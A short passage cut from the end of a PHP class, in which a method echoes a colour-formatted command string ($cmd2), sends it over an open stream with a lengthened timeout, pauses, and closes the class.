        echo "\t\033[36;40;1;1m 2:\033[0m \033[37;40;1;1m $cmd2 \033[0m\n";
        $this->stream4result($this->stream,$cmd2, $this->stream_timeout*5);
    }
    
    $this->pause();
}



}
?>
